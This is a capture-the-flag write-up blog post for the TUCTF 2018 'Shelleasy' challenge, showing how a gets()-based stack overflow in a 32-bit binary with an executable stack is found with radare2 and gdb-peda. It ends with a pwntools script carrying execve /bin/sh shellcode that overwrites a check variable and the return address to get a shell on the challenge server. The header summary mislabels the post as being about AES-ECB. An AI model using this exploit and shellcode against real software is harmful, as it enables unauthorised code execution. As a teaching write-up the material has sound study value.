---
layout:     post
title:      Simple Shellcode Injection
date:       2018-11-23 11:31:19
author:     dr3dd
summary:    this blog demonstrate how AES-ECB mode works and an Simple Attack on it.
categories: Binary-Exploitation
thumbnail:  book
tags:
 - Binary-Exploitation
 - TUCTF-18
 - Shelleasy
 - pwn
---

<h2>TUCTF18(Shelleasy, 345 pt)</h2>
In this challange we have to overwrite variable to 0xdeadbeef and after that inject 32 bit shellcode to stack thats it.<br><br>

**STEP-1**<br>
Binary protection and file type : 

```s
dr3dd@dr3dd-Aspire-F5-573G  ~/ctf-2018/TUctf18/shelleasy  file shella-easy 
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1 =38de2077277362023aadd2209673b21577463b66, not stripped
dr3dd@dr3dd-Aspire-F5-573G  ~/ctf-2018/TUctf18/shelleasy  
```

```s
dr3dd@dr3dd-Aspire-F5-573G  ~/ctf-2018/TUctf18/shelleasy  checksec shella-easy
[*] '/home/dr3dd/ctf-2018/TUctf18/shelleasy/shella-easy'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX disabled
   PIE:      No PIE (0x8048000)
   RWX:      Has RWX segments
dr3dd@dr3dd-Aspire-F5-573G  ~/ctf-2018/TUctf18/shelleasy  
```

We can see that file is 32 bit , not stripped and NX is disable thats mean stack is executable and we can inject our shellcode to stack but there is small problem that is :

```s
dr3dd@dr3dd-Aspire-F5-573G  ~/ctf-2018/TUctf18/shelleasy  r2 -Ad shella-easy 
Process with PID 14996 started...
= attach 14996 14996
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[TOFIX: afta can't run in debugger mode.ions (afta)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
= attach 14996 14996
14996
 -- If you're having fun using radare2, odds are that you're doing something wrong.
[0xf7f33c70]> afl
0x0804834c    3 35           sym._init
0x08048380    1 6            sym.imp.printf
0x08048390    1 6            sym.imp.gets
0x080483a0    1 6            sym.imp.exit
0x080483b0    1 6            sym.imp.__libc_start_main
0x080483c0    1 6            sym.imp.setvbuf
0x080483d0    1 6            sub.__gmon_start_3d0
0x080483e0    1 33           entry0
0x08048410    1 4            sym.__x86.get_pc_thunk.bx
0x08048420    4 43           sym.deregister_tm_clones
0x08048450    4 53           sym.register_tm_clones
0x08048490    3 30           sym.__do_global_dtors_aux
0x080484b0    4 43   -> 40   entry1.init
0x080484db    3 128          sym.main
0x08048560    4 93           sym.__libc_csu_init
0x080485c0    1 2            sym.__libc_csu_fini
0x080485c4    1 20           sym._fini
[0xf7f33c70]> s main
[0x080484db]> pdf
            ;-- main:
/ (fcn) sym.main 128
|   sym.main (int argc, char **argv, char **envp);
|           ; var int local_48h @ ebp-0x48
|           ; var int local_8h @ ebp-0x8
|           ; var int local_4h @ ebp-0x4
|           ; DATA XREF from entry0 (0x80483f7)
|           0x080484db      55             push ebp
|           0x080484dc      89e5           mov ebp, esp
|           0x080484de      53             push ebx
|           0x080484df      83ec44         sub esp, 0x44               ; 'D'
|           0x080484e2      e829ffffff     call sym.__x86.get_pc_thunk.bx
|           0x080484e7      81c3191b0000   add ebx, 0x1b19
|           0x080484ed      8b83fcffffff   mov eax, dword [ebx - 4]
|           0x080484f3      8b00           mov eax, dword [eax]
|           0x080484f5      6a14           push 0x14                   ; 20
|           0x080484f7      6a02           push 2                      ; 2
|           0x080484f9      6a00           push 0
|           0x080484fb      50             push eax
|           0x080484fc      e8bffeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x08048501      83c410         add esp, 0x10
|           0x08048504      8b83f8ffffff   mov eax, dword [ebx - 8]
|           0x0804850a      8b00           mov eax, dword [eax]
|           0x0804850c      6a14           push 0x14                   ; 20
|           0x0804850e      6a02           push 2                      ; 2
|           0x08048510      6a00           push 0
|           0x08048512      50             push eax
|           0x08048513      e8a8feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x08048518      83c410         add esp, 0x10
|           0x0804851b      c745f8bebafe.  mov dword [local_8h], 0xcafebabe
|           0x08048522      8d45b8         lea eax, [local_48h]
|           0x08048525      50             push eax
|           0x08048526      8d83e0e5ffff   lea eax, [ebx - 0x1a20]
|           0x0804852c      50             push eax
|           0x0804852d      e84efeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048532      83c408         add esp, 8
|           0x08048535      8d45b8         lea eax, [local_48h]
|           0x08048538      50             push eax
|           0x08048539      e852feffff     call sym.imp.gets           ; char *gets(char *s)
|           0x0804853e      83c404         add esp, 4
|           0x08048541      817df8efbead.  cmp dword [local_8h], 0xdeadbeef
|       ,=< 0x08048548      7407           je 0x8048551
|       |   0x0804854a      6a00           push 0
|       |   0x0804854c      e84ffeffff     call sym.imp.exit           ; void exit(int status)
|       `-> 0x08048551      b800000000     mov eax, 0
|           0x08048556      8b5dfc         mov ebx, dword [local_4h]
|           0x08048559      c9             leave
\           0x0804855a      c3             ret
[0x080484db]> pdc
function sym.main () {
    //  3 basic blocks

    loc_0x80484db:

       //DATA XREF from entry0 (0x80483f7)
       push ebp
       ebp = esp
       push ebx
       esp -= 0x44              //'D'
       sym.__x86.get_pc_thunk.bx ()
       ebx += 0x1b19            //obj._GLOBAL_OFFSET_TABLE
       eax = dword [ebx - 4]
       eax = dword [eax]
       push 0x14                //20
       push 2                   //2
       push 0
       push eax
                                                    
       int setvbuf(FILE* : unk_format, char * buf : (*0x0) NULL, int mode : (*0x2)0x00177fac = 4294967295, size_t size : (*0x14)0x00177fb0 = 4294967295)
       esp += 0x10
       eax = dword [ebx - 8]
       eax = dword [eax]
       push 0x14                //20
       push 2                   //2
       push 0
       push eax
                                                    
       int setvbuf(FILE* : unk_format, char * buf : (*0x0) NULL, int mode : (*0x2)0x00177fac = 4294967295, size_t size : (*0x14)0x00177fb0 = 4294967295)
       esp += 0x10
       dword [local_8h] = 0xcafebabe
       eax = [local_48h]
       push eax
       eax = [ebx - 0x1a20]     //str.Yeah_I_ll_have_a__p_with_a_side_of_fries_thanks
       push eax                 //(pstr 0x080485e0) "Yeah I'll have a %p with a side of fries thanks\n"
                                                   
       int printf(const char * format : (*0x80485e0)0x00177fac = Yeah I'll have a %p with a side of fries thanks.)
       esp += 8
       eax = [local_48h]
       push eax
                                //(pstr 0x080485e0) "Yeah I'll have a %p with a side of f                                         
       char *gets(char * s : (*0x177fb4)0x00177fb0 =)
       esp += 4
       var = dword [local_8h] - 0xdeadbeef
       if (!var) goto 0x8048551 //unlikely
       {
        loc_0x8048551:

           eax = 0
           ebx = dword [local_4h]   //ebp
           leave                    //ebp
           return
        loc_0x804854a:

           push 0
                                                     
           void exit(int status : (*0x0) NULL)
      }
      return;

}
[0x080484db]> 
```

**STEP-2**<br>
After getting psudo code in radare2 by command 'pdc' we can see that at variable **dword [local_8h] = 0xcafebabe** after that 
it checks

```c
var = dword [local_8h] - 0xdeadbeef
       if (!var) goto 0x8048551
```
if dword **[local_8h]** is not equal to **0xdeadbeef** then program exit. so our first target to modify  **dword [local_8h]** 
to **0xdeadbeef** after that inject our shellcode.
So we have to find offset where it overwrites that variable. 

```s
|           0x08048535      8d45b8         lea eax, [local_48h]
|           0x08048538      50             push eax
|           0x08048539      e852feffff     call sym.imp.gets 
```
Our input save in **[local_48h]** and variable we have to change is at **[local_8h]** so offset is 0x48-0x8 = 64.
So if we send **"A"*64 + "\xef\xbe\xad\xde"** then **[local_8h]** get changed to **0xdeadbeef** and that's our first target.

**STEP-3**

Now we have to find next offset where we can overwrite return address so that we can jump to the shellcode. in gdb we can do 
it by simple commands .

We create a simple cyclic pattern with gdb-peda

```s
gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
```

After that We send it like this : 

```s
gdb-peda$ r < <(python -c 'print "A"*64 + "\xef\xbe\xad\xde"+ "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA"')
Starting program: /home/dr3dd/ctf-2018/TUctf18/shelleasy/shella-easy < <(python -c 'print "A"*64 + "\xef\xbe\xad\xde"+ "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA"')
Yeah I'll have a 0xffffcf90 with a side of fries thanks

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x25414141 ('AAA%')
ECX: 0xf7fa25c0 --> 0xfbad208b 
EDX: 0xf7fa389c --> 0x0 
ESI: 0xf7fa2000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0x41734141 ('AAsA')
ESP: 0xffffcfe0 ("$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
EIP: 0x41414241 ('ABAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414241
[------------------------------------stack-------------------------------------]
0000| 0xffffcfe0 ("$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
0004| 0xffffcfe4 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
0008| 0xffffcfe8 ("A-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
0012| 0xffffcfec ("(AADAA;AA)AAEAAaAA0AAFAAbA")
0016| 0xffffcff0 ("AA;AA)AAEAAaAA0AAFAAbA")
0020| 0xffffcff4 ("A)AAEAAaAA0AAFAAbA")
0024| 0xffffcff8 ("EAAaAA0AAFAAbA")
0028| 0xffffcffc ("AA0AAFAAbA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414241 in ?? ()
gdb-peda$ pattern_offset ABAA
ABAA found at offset: 8
gdb-peda$ 
```
We can see the offset is 8.

So final script is:

```python

from pwn import *

# p = process('./shella-easy')
p = remote('52.15.182.55' ,12345)

# gdb.attach(p,'''
# break *0x08048541
# ''')

shellcode = "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

a = int(p.recv()[17:27],16)
payload = ""
payload += shellcode
payload +=  "A"*(64-48) +"\xef\xbe\xad\xde"
payload += "A"*8
payload += p32(a)

p.sendline(payload)
p.interactive()
```
And We get the shell..!!

```s
 ⚙ dr3dd@dr3dd-Aspire-F5-573G  ~/ctf-2018/TUctf18/shelleasy  python sol.py
[+] Starting local process './shella-easy': pid 17147
[*] Switching to interactive mode
$ ls
core  exp  flag  peda-session-shella-easy.txt  shella-easy  sol.py
$ cat flag
flag{test-flag-here}
$  
```





